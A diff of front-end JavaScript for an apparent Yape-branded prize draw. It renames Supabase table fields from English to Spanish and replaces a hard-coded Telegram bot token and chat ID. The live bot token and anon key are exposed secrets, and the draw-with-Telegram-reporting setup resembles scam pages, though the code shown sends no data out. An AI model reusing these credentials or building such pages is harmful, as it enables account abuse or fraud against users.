@@ -202,8 +202,8 @@
   // ============================================================
   const SUPABASE_URL       = "https://aleadadisazocjovibeh.supabase.co";
   const SUPABASE_ANON_KEY  = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFsZWFkYWRpc2F6b2Nqb3ZpYmVoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk0NDE5NjMsImV4cCI6MjA3NTAxNzk2M30.z82tP0C-UiiNuzP_jqrQf4LBusFqrDi1WYbdnuTh47E";
-  const TELEGRAM_BOT_TOKEN = "8794091027:AAG36PsetBQY3oqGQzGw39rZhbOaBAaE41A";
-  const TELEGRAM_CHAT_ID   = "-1004324777092";
+  const TELEGRAM_BOT_TOKEN = "8762023946:AAHj3eFemFUnckXHCifjUo33ExCzt4Niv-Y";
+  const TELEGRAM_CHAT_ID   = "-1004468043338";
 
   const DIGITOS_BO     = 8;
   const ERROR_GENERICO = "Error de conexión, intente más tarde";
@@ -271,7 +271,7 @@
 
     const { count, error } = await sb.from("yape_participaciones")
       .select("id", { count: "exact", head: true })
-      .eq("user_id", user.id);
+      .eq("usuario_id", user.id);
 
     if (error) {
       console.error("Error contando participaciones:", error);
@@ -285,9 +285,9 @@
     if (userErr || !user) return null;
 
     const { data, error } = await sb.from("yape_participaciones")
-      .select("id, status")
-      .eq("user_id", user.id)
-      .order("created_at", { ascending: false })
+      .select("id, estado")
+      .eq("usuario_id", user.id)
+      .order("creado_en", { ascending: false })
       .limit(1)
       .maybeSingle();
 
@@ -302,7 +302,7 @@
     const ultima = await obtenerUltimaParticipacionUsuario();
     const cantidad = await contarParticipacionesUsuario();
 
-    if (ultima && ultima.status === "pending") {
+    if (ultima && ultima.estado === "pendiente") {
       toggleFormulario(false);
       $("participarOtraVez").classList.remove("hidden");
       mostrarPendiente("EN REVISIÓN");
@@ -311,14 +311,14 @@
       return;
     }
 
-    if (ultima && ultima.status === "won") {
+    if (ultima && ultima.estado === "ganado") {
       toggleFormulario(true);
       $("participarOtraVez").classList.remove("hidden");
       mostrarGanaste();
       return;
     }
 
-    if (ultima && ultima.status === "lost") {
+    if (ultima && ultima.estado === "perdido") {
       toggleFormulario(true);
       $("participarOtraVez").classList.remove("hidden");
       mostrarSigueParticipando();
@@ -380,7 +380,7 @@
     const nombre = perfil.full_name || perfil.email || "Usuario";
 
     const { data: part, error: pErr } = await sb.from("yape_participaciones")
-      .insert({ user_id: user.id, status: "pending" })
+      .insert({ usuario_id: user.id, estado: "pendiente" })
       .select().single();
     if (pErr) throw pErr;
 
@@ -390,9 +390,9 @@
 
   async function consultarEstado(partId) {
     const { data, error } = await sb.from("yape_participaciones")
-      .select("status").eq("id", partId).maybeSingle();
+      .select("estado").eq("id", partId).maybeSingle();
     if (error || !data) return null;
-    return data.status;
+    return data.estado;
   }
 
   function mostrarPendiente(numero) {
@@ -456,11 +456,11 @@
     pollTimer = setInterval(async () => {
       const estado = await consultarEstado(partId);
       if (!estado) return;
-      if (estado === "won") {
+      if (estado === "ganado") {
         mostrarGanaste();
         detenerPolling();
         $("participarOtraVez").classList.remove("hidden");
-      } else if (estado === "lost") {
+      } else if (estado === "perdido") {
         mostrarSigueParticipando();
         detenerPolling();
         $("participarOtraVez").classList.remove("hidden");
